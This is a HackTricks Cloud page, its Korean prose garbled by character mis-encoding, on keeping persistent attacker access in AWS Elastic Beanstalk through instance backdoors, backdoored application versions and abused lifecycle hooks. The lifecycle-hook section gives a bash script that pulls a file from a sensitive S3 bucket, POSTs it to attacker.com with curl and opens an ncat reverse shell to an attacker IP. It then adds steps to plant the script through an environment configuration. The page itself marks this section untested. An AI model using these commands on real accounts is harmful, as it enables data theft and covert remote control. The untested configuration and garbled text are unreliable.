# AWS - Elastic Beanstalk Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Elastic Beanstalk

For more information check:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

### Persistence in Instance

AWS ê³„ì • ë‚´ì—ì„œ ì§€ì†ì„±ì„ ìœ ì§€í•˜ê¸° ìœ„í•´, ì¸ìŠ¤í„´ìŠ¤ ë‚´ë¶€ì— **ì§€ì†ì„± ë©”ì»¤ë‹ˆì¦˜**(cron job, ssh key ë“±)ì„ ë„ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì¸ìŠ¤í„´ìŠ¤ì— ì ‘ê·¼í•˜ì—¬ ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤ì—ì„œ IAM ì—­í•  **ìê²© ì¦ëª…**ì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Backdoor in Version

ê³µê²©ìëŠ” S3 ì €ì¥ì†Œ ë‚´ë¶€ì˜ ì½”ë“œë¥¼ ë°±ë„ì–´ë¡œ ë³€ê²½í•˜ì—¬ í•­ìƒ ë°±ë„ì–´ì™€ ì˜ˆìƒëœ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### New backdoored version

ì‹¤ì œ ë²„ì „ì˜ ì½”ë“œë¥¼ ë³€ê²½í•˜ëŠ” ëŒ€ì‹ , ê³µê²©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ìƒˆë¡œìš´ ë°±ë„ì–´ ë²„ì „ì„ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Abusing Custom Resource Lifecycle Hooks

{% hint style="info" %}
TODO: Test
{% endhint %}

Elastic BeanstalkëŠ” ì¸ìŠ¤í„´ìŠ¤ í”„ë¡œë¹„ì €ë‹ ë° ì¢…ë£Œ ì¤‘ì— ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ë¼ì´í”„ì‚¬ì´í´ í›…ì„ ì œê³µí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” **ë¼ì´í”„ì‚¬ì´í´ í›…ì„ êµ¬ì„±í•˜ì—¬ ì£¼ê¸°ì ìœ¼ë¡œ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê±°ë‚˜ AWS ê³„ì •ì— ëŒ€í•œ ì ‘ê·¼ì„ ìœ ì§€í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
bashCopy code# Attacker creates a script that exfiltrates data and maintains access
echo '#!/bin/bash
aws s3 cp s3://sensitive-data-bucket/data.csv /tmp/data.csv
gzip /tmp/data.csv
curl -X POST --data-binary "@/tmp/data.csv.gz" https://attacker.com/exfil
ncat -e /bin/bash --ssl attacker-ip 12345' > stealthy_lifecycle_hook.sh

# Attacker uploads the script to an S3 bucket
aws s3 cp stealthy_lifecycle_hook.sh s3://attacker-bucket/stealthy_lifecycle_hook.sh

# Attacker modifies the Elastic Beanstalk environment configuration to include the custom lifecycle hook
echo 'Resources:
AWSEBAutoScalingGroup:
Metadata:
AWS::ElasticBeanstalk::Ext:
TriggerConfiguration:
triggers:
- name: stealthy-lifecycle-hook
events:
- "autoscaling:EC2_INSTANCE_LAUNCH"
- "autoscaling:EC2_INSTANCE_TERMINATE"
target:
ref: "AWS::ElasticBeanstalk::Environment"
arn:
Fn::GetAtt:
- "AWS::ElasticBeanstalk::Environment"
- "Arn"
stealthyLifecycleHook:
Type: AWS::AutoScaling::LifecycleHook
Properties:
AutoScalingGroupName:
Ref: AWSEBAutoScalingGroup
LifecycleTransition: autoscaling:EC2_INSTANCE_LAUNCHING
NotificationTargetARN:
Ref: stealthy-lifecycle-hook
RoleARN:
Fn::GetAtt:
- AWSEBAutoScalingGroup
- Arn' > stealthy_lifecycle_hook.yaml

# Attacker applies the new environment configuration
aws elasticbeanstalk update-environment --environment-name my-env --option-settings Namespace="aws:elasticbeanstalk:customoption",OptionName="CustomConfigurationTemplate",Value="stealthy_lifecycle_hook.yaml"
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
